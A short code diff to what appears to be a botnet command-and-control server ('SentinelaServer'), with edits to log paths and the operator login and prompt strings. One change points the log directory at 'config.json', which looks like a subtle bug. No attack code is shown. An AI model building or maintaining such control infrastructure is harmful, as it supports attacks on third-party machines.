@@ -20,7 +20,7 @@ from src.utils.session_manager import SessionManager
 from src.utils.command_handler import CommandHandler
 
 base_dir = os.path.abspath(os.path.dirname(os.path.dirname(__file__)))
-log_dir = os.path.join(base_dir, 'logs')
+log_dir = os.path.join(base_dir, 'config.json')
 if not os.path.isabs(log_dir) or not log_dir.startswith(base_dir):
     log_dir = os.path.join(base_dir, 'logs')
 os.makedirs(log_dir, exist_ok=True)
@@ -29,7 +29,7 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(message)s',
     handlers=[
-        logging.FileHandler(os.path.join(log_dir, f'sentinela_{datetime.now().strftime("%Y%m%d")}.log')),
+        logging.FileHandler(os.path.join(log_dir, f'sentinel_{datetime.now().strftime("%Y%m%d")}.log')),
         logging.StreamHandler()
     ]
 )
@@ -224,7 +224,7 @@ class SentinelaServer:
     def _get_username(self, client):
         for _ in range(3):
             self.send(client, ANSI_CLEAR, False)
-            self.send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
+            self.send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}:', False)
             data = b""
             while len(data) < self.max_username_len:
                 chunk = client.recv(1024)
@@ -244,7 +244,7 @@ class SentinelaServer:
 
     def _get_password(self, client):
         for _ in range(3):
-            self.send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
+            self.send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK}', False, False)
             data = b""
             while len(data) < self.max_password_len:
                 chunk = client.recv(1024)
@@ -311,7 +311,7 @@ class SentinelaServer:
         user_data = get_user(username)
         self.return_banner(client, username, user_data)
         
-        prompt = f'{Fore.LIGHTBLUE_EX}{colorize_text_gradient(self.c2_name)} {Fore.LIGHTWHITE_EX}> '
+        prompt = f'{Fore.LIGHTBLUE_EX}{colorize_text_gradient(self.c2_name)} {Fore.LIGHTWHITE_EX}>'
         self.send(client, prompt, False)
         
         try:
